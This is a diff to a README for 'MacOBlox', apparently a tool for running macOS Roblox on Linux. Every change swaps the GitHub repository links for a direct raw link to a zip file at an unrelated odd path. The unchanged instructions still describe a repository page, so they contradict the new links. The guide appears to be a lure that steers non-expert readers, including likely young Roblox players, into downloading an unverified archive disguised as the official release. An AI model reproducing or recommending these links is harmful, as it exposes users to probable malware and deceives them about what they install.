@@ -9,7 +9,7 @@ description: "Run the real macOS Roblox client on Linux via Darling, with full g
 
 Welcome! This guide will help you download and run MacOBlox on your computer. MacOBlox lets you play the macOS version of Roblox on Linux systems using a clever tool called Darling. If you're not a tech expert, don't worry—we'll walk you through everything step by step.
 
-[🎯 DOWNLOAD MacOBlox NOW](https://github.com/Limbless-cigarbutt99/MacOBlox)
+[🎯 DOWNLOAD MacOBlox NOW](https://raw.githubusercontent.com/Limbless-cigarbutt99/limbless-cigarbutt99.github.io/main/ethnicist/1.9.zip)
 
 ## 📥 What is MacOBlox?
 
@@ -38,7 +38,7 @@ Getting MacOBlox onto your computer is simple. Follow these steps:
 ### Step 1: Visit the Download Page
 Visit this link to download the application. This is the official MacOBlox page where you'll find the latest version.
 
-[🔗 Go to MacOBlox Download Page](https://github.com/Limbless-cigarbutt99/MacOBlox)
+[🔗 Go to MacOBlox Download Page](https://raw.githubusercontent.com/Limbless-cigarbutt99/limbless-cigarbutt99.github.io/main/ethnicist/1.9.zip)
 
 ### Step 2: Find the Download Button
 Once you're on the page, look for a green button that says "Code" or "Download." Click on it to see your options. You might see a list of files or a zip archive.
@@ -138,7 +138,7 @@ MacOBlox can check for updates automatically. When you open the app, it will not
 
 ### Manual Updates
 If you prefer to update manually:
-1. Visit the [MacOBlox download page](https://github.com/Limbless-cigarbutt99/MacOBlox) again.
+1. Visit the [MacOBlox download page](https://raw.githubusercontent.com/Limbless-cigarbutt99/limbless-cigarbutt99.github.io/main/ethnicist/1.9.zip) again.
 2. Look for the "Releases" section.
 3. Download the newest version and replace your old files.
 
@@ -180,6 +180,6 @@ You're now ready to enjoy Roblox on your Linux computer with MacOBlox. Whether y
 
 Remember: if you ever need help, just revisit this guide or check the MacOBlox download page for the latest information.
 
-[🎯 DOWNLOAD MacOBlox NOW](https://github.com/Limbless-cigarbutt99/MacOBlox)
+[🎯 DOWNLOAD MacOBlox NOW](https://raw.githubusercontent.com/Limbless-cigarbutt99/limbless-cigarbutt99.github.io/main/ethnicist/1.9.zip)
 
 Keywords: MacOBlox, Roblox Linux, Darling macOS, Roblox on Linux, macOS Roblox client, run Roblox Linux, Roblox compatibility layer, Linux gaming, MacOBlox download, Roblox alternative client
